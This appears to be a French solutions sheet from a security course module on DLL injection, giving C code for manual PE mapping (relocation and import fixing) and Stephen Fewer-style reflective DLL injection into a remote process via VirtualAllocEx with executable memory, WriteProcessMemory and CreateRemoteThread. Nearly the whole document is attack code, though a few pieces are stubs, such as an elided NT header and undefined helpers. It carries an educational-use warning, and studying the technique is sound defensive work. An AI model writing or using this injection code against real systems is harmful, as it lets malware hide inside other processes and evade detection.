⚠️ AVERTISSEMENT STRICT - Usage éducatif uniquement

SOLUTIONS - MODULE 25 : DLL INJECTION

===============================================================================
SOLUTION 2 : MANUAL MAPPING COMPLET
===============================================================================

// Fix relocations
void fix_relocations(LPVOID base, LPVOID preferred_base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);

    DWORD delta = (BYTE*)base - (BYTE*)preferred_base;
    if (delta == 0) return;

    PIMAGE_DATA_DIRECTORY reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (reloc_dir->Size == 0) return;

    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)base + reloc_dir->VirtualAddress);

    while (reloc->VirtualAddress) {
        DWORD num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* reloc_data = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < num_entries; i++) {
            WORD type = reloc_data[i] >> 12;
            WORD offset = reloc_data[i] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD_PTR* patch_addr = (DWORD_PTR*)((BYTE*)base + reloc->VirtualAddress + offset);
                *patch_addr += delta;
            }
        }

        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
    }
}

// Fix imports
void fix_imports(LPVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);

    PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)
        ((BYTE*)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (import_desc->Name) {
        char* module_name = (char*)((BYTE*)base + import_desc->Name);
        HMODULE module = LoadLibraryA(module_name);

        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)base + import_desc->FirstThunk);
        PIMAGE_THUNK_DATA orig_thunk = (PIMAGE_THUNK_DATA)((BYTE*)base + import_desc->OriginalFirstThunk);

        while (orig_thunk->u1.AddressOfData) {
            FARPROC func_addr;

            if (orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                func_addr = GetProcAddress(module, (LPCSTR)(orig_thunk->u1.Ordinal & 0xFFFF));
            } else {
                PIMAGE_IMPORT_BY_NAME import_name = (PIMAGE_IMPORT_BY_NAME)
                    ((BYTE*)base + orig_thunk->u1.AddressOfData);
                func_addr = GetProcAddress(module, import_name->Name);
            }

            thunk->u1.Function = (DWORD_PTR)func_addr;
            thunk++;
            orig_thunk++;
        }

        import_desc++;
    }
}

===============================================================================
SOLUTION 3 : REFLECTIVE DLL
===============================================================================

// ReflectiveLoader stub (en DLL)
__declspec(dllexport) DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // 1. Trouver notre base address en mémoire
    LPVOID our_base = find_our_base();  // Via stack walking
    
    // 2. Relocate ourselves
    fix_relocations(our_base, preferred_base);
    
    // 3. Fix imports
    fix_imports(our_base);
    
    // 4. Call DllMain
    typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);
    PIMAGE_NT_HEADERS nt = ...;
    DllMainFunc dll_main = (DllMainFunc)((BYTE*)our_base + nt->OptionalHeader.AddressOfEntryPoint);
    
    dll_main((HINSTANCE)our_base, DLL_PROCESS_ATTACH, NULL);
    
    return 0;
}

// Injection
BOOL inject_reflective(DWORD pid, LPVOID dll_data, SIZE_T dll_size) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allouer et copier DLL entière
    LPVOID remote_mem = VirtualAllocEx(hProc, NULL, dll_size,
                                      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remote_mem, dll_data, dll_size, NULL);
    
    // Trouver offset du ReflectiveLoader
    DWORD loader_offset = find_reflective_loader_offset(dll_data);
    
    // Execute loader
    CreateRemoteThread(hProc, NULL, 0,
                      (LPTHREAD_START_ROUTINE)((BYTE*)remote_mem + loader_offset),
                      NULL, 0, NULL);
    
    CloseHandle(hProc);
    return TRUE;
}

Référence : Stephen Fewer's Reflective DLL Injection
